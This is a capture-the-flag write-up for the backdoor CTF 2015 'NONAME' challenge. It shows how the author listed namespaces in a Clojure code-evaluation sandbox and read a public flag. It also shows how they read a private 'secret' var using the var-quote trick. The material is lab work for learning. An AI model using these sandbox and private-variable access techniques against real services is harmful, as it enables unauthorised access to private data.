# backdoor CTF 2015: [NONAME](https://backdoor.sdslabs.co/challenges/NONAME)

**Category:** Exploit
**Points:** 200
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:**
**Solves:** 25
**Description:** 

* <https://backdoor.sdslabs.co/challenges/NONAME>

> Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can't get the flag. Can you? Visit [this](https://agile-garden-1672.herokuapp.com/). Submit the SHA-256 hash of the flag obtained.

## Write-up

We are given a Clojure sandbox and have to find the flag and secret of an user named admin.

Entering valid clojure code, we can execute several functions, e.g. printing the version:

```clojure
Give me some code:
> (clojure-version)
"1.4.0"
```

After learning about clojure, we first print the complete [namespace](http://clojure.org/namespaces) to find any suspicious imported functions or namespaces using the [all-ns](http://clojure.github.io/clojure/clojure.core-api.html#clojure.core/all-ns) function:

```clojure
> (all-ns)
[..see all-ns file..]
```

We see a namespace named `noname.people.admin`, so we try to find any variables within this namespace after importing this namespace:

```clojure
> (require '[noname.people.admin :as adm])
nil
> (adm/flag)
Ma flag is : [REDACTED]
> (adm/secret)
java.lang.IllegalStateException: var: #'noname.people.admin/secret is not public
```

Mhh, we can access the variable flag, but can't access secret. Secret must be private. Fortunately, there is a way to read private variables described [here](http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions):

```clojure
> (#'adm/secret)
"Ma secret is: [REDACTED]"
```

We concat these two strings and make a sha256 hash out of them and get the flag!

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/>
* <https://babyphd.net/2015/04/backdoorctf-writeup/>
* [Indonesian](https://docs.google.com/document/d/1O6TLRT0Vvyd5YT_GBlHvrCuhuGM_E_CJXXitNsdNbaw/edit)
